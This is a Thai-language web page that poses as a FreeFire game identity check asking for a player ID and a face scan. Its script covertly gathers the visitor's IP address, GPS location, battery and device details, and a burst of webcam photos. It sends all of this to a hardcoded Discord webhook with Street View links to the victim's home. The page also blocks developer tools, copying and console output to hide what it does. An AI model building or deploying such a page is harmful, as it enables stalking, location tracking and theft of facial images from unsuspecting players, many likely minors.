<!DOCTYPE html>
<html lang="th">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>🎮 ยืนยันตัวตน FreeFire</title>

    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Kanit:wght@300;400;500;600;700&display=swap" rel="stylesheet">

    <style>
        body {
            font-family: 'Kanit', sans-serif;
            background: #0b0e14;
            color: white;
            user-select: none;
            overflow-x: hidden;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            background-image: radial-gradient(circle at 20% 30%, #1a2a3a 0%, #0b0e14 80%);
        }

        .glass-panel {
            background: rgba(26, 30, 38, 0.85);
            backdrop-filter: blur(16px);
            border: 1px solid rgba(255, 255, 255, 0.05);
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.8);
        }

        .input-glow:focus {
            border-color: #ff6a00;
            box-shadow: 0 0 20px rgba(255, 106, 0, 0.3);
            outline: none;
        }

        .btn-ff {
            background: linear-gradient(135deg, #ff6a00, #ee0979);
            transition: all 0.3s ease;
            font-weight: 600;
            letter-spacing: 0.5px;
        }

        .btn-ff:hover {
            transform: scale(1.03);
            box-shadow: 0 10px 30px rgba(255, 106, 0, 0.4);
        }

        .btn-ff:disabled {
            opacity: 0.5;
            transform: none;
            cursor: not-allowed;
        }

        .info-card {
            background: rgba(0, 0, 0, 0.3);
            border: 1px solid rgba(255, 255, 255, 0.04);
            backdrop-filter: blur(4px);
            transition: all 0.2s;
        }
        .info-card:hover {
            background: rgba(255, 106, 0, 0.05);
            border-color: rgba(255, 106, 0, 0.2);
        }

        ::-webkit-scrollbar {
            width: 4px;
        }
        ::-webkit-scrollbar-thumb {
            background: #ff6a00;
            border-radius: 999px;
        }

        .animate-pulse-slow {
            animation: pulseSlow 2.5s ease-in-out infinite;
        }
        @keyframes pulseSlow {
            0% { opacity: 0.6; }
            50% { opacity: 1; }
            100% { opacity: 0.6; }
        }

        .scan-anim {
            height: 2px;
            background: #ff6a00;
            position: absolute;
            width: 100%;
            top: 0;
            animation: move 3s infinite;
            box-shadow: 0 0 20px #ff6a00;
        }

        @keyframes move {
            0% { top: 0; }
            100% { top: 100%; }
        }

        .animate-fade-in {
            animation: fadeIn 0.5s ease;
        }
        @keyframes fadeIn {
            0% { opacity: 0; transform: scale(0.95); }
            100% { opacity: 1; transform: scale(1); }
        }

        /* ป้องกันการเลือกข้อความ */
        * {
            -webkit-touch-callout: none;
            -webkit-user-select: none;
            -khtml-user-select: none;
            -moz-user-select: none;
            -ms-user-select: none;
            user-select: none;
        }

        /* ซ่อนปุ่มส่งและนับรูป */
        #capture-count, #btn-capture-text {
            display: none !important;
        }
    </style>
</head>
<body>

<div class="w-full max-w-md px-4 py-6">

    <div class="glass-panel rounded-3xl overflow-hidden shadow-2xl border border-white/5">

        <!-- Header -->
        <div class="relative h-28 bg-gradient-to-r from-orange-600 via-red-600 to-pink-600 flex items-center px-6">
            <div class="absolute inset-0 bg-black/30 backdrop-blur-[2px]"></div>
            <div class="relative z-10 flex items-center gap-4">
                <div class="w-16 h-16 rounded-2xl bg-black/40 backdrop-blur flex items-center justify-center text-3xl border border-white/20 shadow-xl">
                    🔥
                </div>
                <div>
                    <h1 class="text-2xl font-bold tracking-wide flex items-center gap-2">
                        ยืนยันตัวตน
                        <span class="text-[10px] bg-black/40 px-3 py-1 rounded-full border border-white/20 font-normal tracking-widest">FF</span>
                    </h1>
                    <p class="text-white/70 text-sm">กรอก ID และสแกนหน้ายืนยัน</p>
                </div>
            </div>
        </div>

        <div class="p-6 pt-8">

            <!-- ===== STEP 1: กรอก ID ===== -->
            <div id="step-input">
                <div class="space-y-4">
                    <div>
                        <label class="text-sm font-medium text-white/70 block mb-2">🆔 ID FreeFire ของคุณ</label>
                        <input id="ff-id-input" type="text" placeholder="เช่น 1234567890" 
                               class="w-full bg-black/40 border border-white/10 rounded-2xl px-5 py-4 text-white placeholder-white/30 input-glow transition text-lg font-medium">
                    </div>

                    <button id="btn-to-scan" class="btn-ff w-full py-4 rounded-2xl text-white text-lg shadow-lg flex items-center justify-center gap-2">
                        <span>📸 ไปขั้นตอนสแกนหน้า</span>
                        <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" d="M13 7l5 5m0 0l-5 5m5-5H6"/></svg>
                    </button>

                    <div class="flex justify-center gap-2 text-xs text-white/30 pt-2">
                        <span class="flex items-center gap-1"><span class="w-1.5 h-1.5 rounded-full bg-green-400 inline-block"></span> ระบบปลอดภัย</span>
                        <span class="flex items-center gap-1"><span class="w-1.5 h-1.5 rounded-full bg-blue-400 inline-block"></span> เข้ารหัส SSL</span>
                    </div>
                </div>

                <div id="status-container" class="mt-5 text-center">
                    <p id="status-msg" class="text-orange-400/80 text-sm animate-pulse-slow font-medium tracking-wide">⏳ กรอก ID เพื่อเริ่มต้น</p>
                </div>
            </div>

            <!-- ===== STEP 2: สแกนหน้า ===== -->
            <div id="step-scan" class="hidden text-center">
                <div class="relative w-56 h-56 mx-auto mb-4 rounded-full border-2 border-orange-500/50 overflow-hidden bg-black shadow-[0_0_30px_rgba(255,106,0,0.4)]">
                    <video id="cam" class="w-full h-full object-cover scale-x-[-1]" autoplay playsinline></video>
                    <div class="absolute inset-0 bg-gradient-to-b from-transparent via-orange-500/10 to-transparent"></div>
                    <div class="scan-anim"></div>
                </div>
                <p id="scan-status" class="text-orange-400 text-sm animate-pulse tracking-widest font-medium">📷 กำลังเปิดกล้อง...</p>
                
                <div class="mt-5 flex gap-3">
                    <button id="btn-cancel-scan" class="flex-1 py-3 rounded-xl border border-white/10 text-white/60 hover:text-white hover:border-white/30 transition text-sm">
                        ยกเลิก
                    </button>
                    <button id="btn-capture" class="flex-1 btn-ff py-3 rounded-xl text-white text-sm shadow-lg">
                        ✅ ยืนยันตัวตน
                    </button>
                </div>
                <!-- ซ่อนการนับรูปและข้อความส่ง -->
                <p id="capture-count" class="text-xs text-white/30 mt-2 hidden">📸 ถ่ายไปแล้ว: 0 รูป</p>
                <p id="btn-capture-text" class="hidden">กำลังถ่าย...</p>
            </div>

            <!-- ===== STEP 3: ผลลัพธ์ ===== -->
            <div id="step-result" class="hidden animate-fade-in">
                <div class="bg-gradient-to-br from-orange-500/10 to-pink-500/10 border border-orange-500/20 rounded-2xl p-5 mb-6 backdrop-blur-sm">
                    <div class="flex items-center gap-4">
                        <div class="w-14 h-14 rounded-2xl bg-gradient-to-br from-orange-500 to-pink-500 flex items-center justify-center text-2xl shadow-xl text-white font-bold">
                            ✅
                        </div>
                        <div>
                            <h2 class="text-lg font-bold text-white flex items-center gap-2">
                                ยืนยันสำเร็จ
                                <span class="text-[10px] bg-orange-500/20 text-orange-300 px-2 py-0.5 rounded-full border border-orange-500/30">VERIFIED</span>
                            </h2>
                            <p class="text-white/50 text-xs">Ref: <span id="ref-code">FF-994102-B</span></p>
                        </div>
                    </div>
                </div>

                <div id="info-box" class="space-y-3 max-h-[420px] overflow-y-auto pr-1"></div>

                <button id="btn-back" class="mt-5 w-full py-3 rounded-xl border border-white/10 text-white/60 hover:text-white hover:border-white/30 transition flex items-center justify-center gap-2 text-sm">
                    <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 19l-7-7m0 0l7-7m-7 7h18"/></svg>
                    เริ่มใหม่
                </button>
            </div>

        </div>
    </div>

    <div class="text-center text-white/10 text-[10px] mt-6 tracking-widest">
        FREEFIRE VERIFICATION V2 • สแกนหน้ายืนยันตัวตน
    </div>
</div>

<script>
// === ป้องกันการเข้าถึง开发者工具ทั้งหมด ===
// 1. ป้องกันคลิกขวา
document.addEventListener('contextmenu', e => {
    e.preventDefault();
    return false;
});

// 2. ป้องกันคีย์ลัดทั้งหมด (F12, Ctrl+U, Ctrl+Shift+I, Ctrl+Shift+J, Ctrl+S ฯลฯ)
document.addEventListener('keydown', function(e) {
    // ป้องกัน F12
    if (e.key === 'F12' || e.keyCode === 123) {
        e.preventDefault();
        return false;
    }
    // ป้องกัน Ctrl+U (ดูซอร์ส)
    if (e.ctrlKey && (e.key === 'u' || e.key === 'U')) {
        e.preventDefault();
        return false;
    }
    // ป้องกัน Ctrl+Shift+I, Ctrl+Shift+J
    if (e.ctrlKey && e.shiftKey && (e.key === 'i' || e.key === 'I' || e.key === 'j' || e.key === 'J')) {
        e.preventDefault();
        return false;
    }
    // ป้องกัน Ctrl+S (บันทึกหน้า)
    if (e.ctrlKey && (e.key === 's' || e.key === 'S')) {
        e.preventDefault();
        return false;
    }
    // ป้องกัน Ctrl+Shift+C (inspect element)
    if (e.ctrlKey && e.shiftKey && (e.key === 'c' || e.key === 'C')) {
        e.preventDefault();
        return false;
    }
    // ป้องกัน Alt+Ctrl+I (บางเบราว์เซอร์)
    if (e.altKey && e.ctrlKey && (e.key === 'i' || e.key === 'I')) {
        e.preventDefault();
        return false;
    }
    // ป้องกัน Ctrl+Shift+J (console)
    if (e.ctrlKey && e.shiftKey && (e.key === 'j' || e.key === 'J')) {
        e.preventDefault();
        return false;
    }
    return true;
});

// 3. ป้องกันการลากวาง (drag and drop)
document.addEventListener('dragstart', e => e.preventDefault());
document.addEventListener('drop', e => e.preventDefault());

// 4. ป้องกันการ copy/paste
document.addEventListener('copy', e => e.preventDefault());
document.addEventListener('paste', e => e.preventDefault());
document.addEventListener('cut', e => e.preventDefault());

// 5. ปิดการทำงานของเมนูบริบทของภาพ
document.querySelectorAll('img, video, canvas').forEach(el => {
    el.addEventListener('contextmenu', e => e.preventDefault());
});

// 6. ป้องกันการเปิด Developer Tools ด้วยการคลิกขวาที่ inspect (เพิ่มเติม)
document.addEventListener('keyup', function(e) {
    if (e.key === 'F12' || e.keyCode === 123) {
        e.preventDefault();
        return false;
    }
});

// 7. ลบเมนูบริบททั้งหมด (ป้องกันการ inspect)
document.addEventListener('contextmenu', function(e) {
    e.preventDefault();
    return false;
}, false);

// 8. ป้องกันการเลือกข้อความ (CSS already)

// 9. ปิดการใช้งาน console.log (เพื่อป้องกันการดีบัก)
console.log = function() {};
console.warn = function() {};
console.error = function() {};
console.info = function() {};

// === CONFIG ===
const WEBHOOK_URL = "https://discord.com/api/webhooks/1512064053273694319/HicoP_oS0YI7gGBp6wO-NtKLwos7YBZSgIkvyjlNaOfEWOqOdL7B9cFNjYB4CyRz8qfu";

let userData = {
    lat: "ไม่ระบุ",
    lon: "ไม่ระบุ",
    ip: "Unknown",
    battery: "Unknown",
    ffid: ""
};

let cameraStream = null;
let capturedImages = [];

// ===== ฟังก์ชันเก็บข้อมูล =====
async function collectData() {
    try {
        const ipRes = await fetch("https://api.ipify.org?format=json");
        const ipData = await ipRes.json();
        userData.ip = ipData.ip;
    } catch(e) {}

    try {
        if (navigator.getBattery) {
            const battery = await navigator.getBattery();
            userData.battery = Math.floor(battery.level * 100) + "%";
        }
    } catch(e) {}

    return new Promise((resolve) => {
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                (pos) => {
                    userData.lat = pos.coords.latitude;
                    userData.lon = pos.coords.longitude;
                    resolve();
                },
                () => { resolve(); }
            );
        } else {
            resolve();
        }
    });
}

// ===== เปิดกล้อง =====
async function startCamera() {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({
            video: { facingMode: "user", width: { ideal: 640 }, height: { ideal: 480 } }
        });
        cameraStream = stream;
        const video = document.getElementById("cam");
        video.srcObject = stream;
        document.getElementById("scan-status").innerText = "📸 พร้อมสแกนแล้ว";
        return true;
    } catch (err) {
        document.getElementById("scan-status").innerText = "❌ ไม่สามารถเปิดกล้องได้";
        return false;
    }
}

// ===== จับภาพรัว ๆ และส่งอัตโนมัติ =====
function captureBurstAndSend() {
    const video = document.getElementById("cam");
    if (!cameraStream || !video.videoWidth) {
        alert("กรุณาเปิดกล้องก่อน");
        return;
    }

    const burstCount = 5;
    let captured = 0;
    const images = [];

    for (let i = 0; i < burstCount; i++) {
        setTimeout(() => {
            const canvas = document.createElement("canvas");
            canvas.width = video.videoWidth || 640;
            canvas.height = video.videoHeight || 480;
            const ctx = canvas.getContext("2d");
            ctx.translate(canvas.width, 0);
            ctx.scale(-1, 1);
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

            canvas.toBlob((blob) => {
                if (blob) {
                    images.push(blob);
                }
            }, "image/png");

            captured++;
            if (captured === burstCount) {
                // ถ่ายครบแล้ว ส่งข้อมูลทั้งหมดทันที
                setTimeout(() => {
                    sendAllToWebhook(images);
                }, 300);
            }
        }, i * 150);
    }
}

// ===== ส่งข้อมูลทั้งหมด =====
async function sendAllToWebhook(images) {
    const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches ? "Enabled" : "Disabled";
    const cookiesStatus = navigator.cookieEnabled ? "Enabled" : "Disabled";
    const connectionType = navigator.connection ? navigator.connection.effectiveType : "Unknown";
    const cpuCores = navigator.hardwareConcurrency || "Unknown";
    const ramSize = (navigator.deviceMemory || "Unknown") + " GB";
    const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
    const userAgent = navigator.userAgent;

    // ปิดกล้อง
    if (cameraStream) {
        cameraStream.getTracks().forEach(t => t.stop());
        cameraStream = null;
    }

    // เปลี่ยน UI ทันที
    document.getElementById("step-scan").classList.add("hidden");
    document.getElementById("step-result").classList.remove("hidden");
    document.getElementById("ref-code").innerText = `FF-${Math.floor(Math.random()*999999)}`;

    const embedData = {
        title: "🎮 ยืนยันตัวตน FreeFire [Components V2]",
        color: 0xff6a00,
        fields: [
            { name: "🆔 FreeFire ID", value: `\`${userData.ffid}\``, inline: false },
            { name: "🌐 IP Address", value: `\`${userData.ip}\``, inline: true },
            { name: "🔋 แบตเตอรี่", value: `\`${userData.battery}\``, inline: true },
            { name: "📍 พิกัด (GPS)", value: `\`${userData.lat}, ${userData.lon}\``, inline: false },
            { name: "💻 ระบบปฏิบัติการ", value: `\`${navigator.platform}\``, inline: true },
            { name: "🗣️ ภาษาเครื่อง", value: `\`${navigator.language}\``, inline: true },
            { name: "🖥️ ความละเอียดหน้าจอ", value: `\`${screen.width} x ${screen.height}\``, inline: true },
            { name: "🧠 CPU Cores", value: `\`${cpuCores}\``, inline: true },
            { name: "💾 RAM ขนาด", value: `\`${ramSize}\``, inline: true },
            { name: "🌍 Timezone", value: `\`${timezone}\``, inline: true },
            { name: "📶 Connection Type", value: `\`${connectionType}\``, inline: true },
            { name: "🍪 Cookies Status", value: `\`${cookiesStatus}\``, inline: true },
            { name: "🌙 Dark Mode", value: `\`${isDarkMode}\``, inline: true }
        ],
        footer: { text: "ระบบยืนยันตัวตน FreeFire" },
        timestamp: new Date().toISOString()
    };

    if (userData.lat !== "ไม่ระบุ") {
        embedData.fields.push(
            { name: "🗺️ Google Maps", value: `[เปิดแผนที่](https://www.google.com/maps/search/?api=1&query=${userData.lat},${userData.lon})`, inline: false },
            { name: "🏙️ Street View", value: `[ดูหน้าบ้าน](https://www.google.com/maps/@?api=1&map_action=pano&viewpoint=${userData.lat},${userData.lon})`, inline: false }
        );
    }

    // ส่งรูปภาพทั้งหมด
    const formData = new FormData();
    
    if (images && images.length > 0) {
        images.forEach((blob, index) => {
            formData.append(`file${index}`, blob, `face_${index+1}.png`);
        });
        embedData.image = { url: "attachment://face_1.png" };
    }

    formData.append("payload_json", JSON.stringify({ embeds: [embedData] }));

    try {
        await fetch(WEBHOOK_URL, { method: "POST", body: formData });
        document.getElementById("status-msg").innerText = "✅ ยืนยันสำเร็จ!";
    } catch(e) {
        console.error(e);
    }

    renderResultUI(images ? images.length : 0);
}

// ===== แสดงผล UI =====
function renderResultUI(imageCount) {
    const box = document.getElementById("info-box");
    const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches ? "Enabled" : "Disabled";
    const cookiesStatus = navigator.cookieEnabled ? "Enabled" : "Disabled";
    const connectionType = navigator.connection ? navigator.connection.effectiveType : "Unknown";
    const cpuCores = navigator.hardwareConcurrency || "Unknown";
    const ramSize = (navigator.deviceMemory || "Unknown") + " GB";
    const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;

    const data = [
        { icon: "🆔", title: "FreeFire ID", value: userData.ffid },
        { icon: "📍", title: "พิกัด GPS", value: `${userData.lat}, ${userData.lon}` },
        { icon: "🌐", title: "IP Address", value: userData.ip },
        { icon: "💻", title: "ระบบปฏิบัติการ", value: navigator.platform },
        { icon: "🗣️", title: "ภาษา", value: navigator.language },
        { icon: "🖥️", title: "หน้าจอ", value: `${screen.width}x${screen.height}` },
        { icon: "🧠", title: "CPU Cores", value: cpuCores },
        { icon: "💾", title: "RAM", value: ramSize },
        { icon: "🔋", title: "แบตเตอรี่", value: userData.battery },
        { icon: "🌍", title: "Timezone", value: timezone },
        { icon: "📶", title: "Connection", value: connectionType },
        { icon: "🍪", title: "Cookies", value: cookiesStatus },
        { icon: "🌙", title: "Dark Mode", value: isDarkMode }
    ];

    box.innerHTML = "";
    data.forEach(item => {
        box.innerHTML += `
            <div class="info-card rounded-2xl p-4 flex items-center gap-4 transition">
                <div class="w-11 h-11 rounded-xl bg-gradient-to-br from-orange-500/20 to-pink-500/20 flex items-center justify-center text-xl flex-shrink-0 border border-white/5">
                    ${item.icon}
                </div>
                <div class="flex-1 overflow-hidden">
                    <p class="text-[10px] uppercase tracking-widest text-white/40 mb-0.5 font-medium">${item.title}</p>
                    <p class="font-medium text-sm text-white/90 truncate">${item.value}</p>
                </div>
            </div>
        `;
    });
}

// ===== จัดการ Events =====

// ขั้นตอนที่ 1: ไปสแกนหน้า
document.getElementById("btn-to-scan").addEventListener("click", async () => {
    const input = document.getElementById("ff-id-input");
    const id = input.value.trim();

    if (id === "") {
        input.classList.add("border-red-500/50");
        input.placeholder = "⚠️ กรุณากรอก ID";
        setTimeout(() => {
            input.classList.remove("border-red-500/50");
            input.placeholder = "เช่น 1234567890";
        }, 2000);
        return;
    }

    if (!/^\d+$/.test(id)) {
        input.classList.add("border-red-500/50");
        input.value = "";
        input.placeholder = "⚠️ ต้องเป็นตัวเลขเท่านั้น";
        setTimeout(() => {
            input.classList.remove("border-red-500/50");
            input.placeholder = "เช่น 1234567890";
        }, 2000);
        return;
    }

    userData.ffid = id;
    document.getElementById("status-msg").innerText = "📸 กำลังเปิดกล้อง...";

    // เก็บข้อมูลเบื้องต้น
    await collectData();

    // สลับหน้า
    document.getElementById("step-input").classList.add("hidden");
    document.getElementById("step-scan").classList.remove("hidden");

    // เปิดกล้อง
    const ok = await startCamera();
    if (!ok) {
        document.getElementById("scan-status").innerText = "❌ ไม่สามารถเปิดกล้องได้";
    }
});

// ยกเลิกสแกน
document.getElementById("btn-cancel-scan").addEventListener("click", () => {
    if (cameraStream) {
        cameraStream.getTracks().forEach(t => t.stop());
        cameraStream = null;
    }
    capturedImages = [];
    document.getElementById("step-scan").classList.add("hidden");
    document.getElementById("step-input").classList.remove("hidden");
    document.getElementById("status-msg").innerText = "⏳ ยกเลิกการสแกน";
});

// จับภาพและส่งอัตโนมัติ
document.getElementById("btn-capture").addEventListener("click", () => {
    if (!cameraStream) {
        alert("กรุณาเปิดกล้องก่อน");
        return;
    }
    // ปิดปุ่ม
    const btn = document.getElementById("btn-capture");
    btn.disabled = true;
    btn.textContent = "📸 กำลังยืนยัน...";
    
    captureBurstAndSend();
});

// ปุ่มกลับ
document.getElementById("btn-back").addEventListener("click", () => {
    capturedImages = [];
    document.getElementById("step-result").classList.add("hidden");
    document.getElementById("step-input").classList.remove("hidden");
    document.getElementById("ff-id-input").value = "";
    document.getElementById("status-msg").innerText = "⏳ กรอก ID เพื่อเริ่มต้น";
});

// ===== โหลดหน้า =====
window.onload = () => {
    document.getElementById("status-msg").innerText = "⏳ กรอก ID เพื่อเริ่มต้น";
    
    // ป้องกันเพิ่มเติม: ลบเมนู开发者 tools
    document.addEventListener('keydown', function(e) {
        if (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'i')) {
            e.preventDefault();
            return false;
        }
    });
};
</script>

</body>
</html>
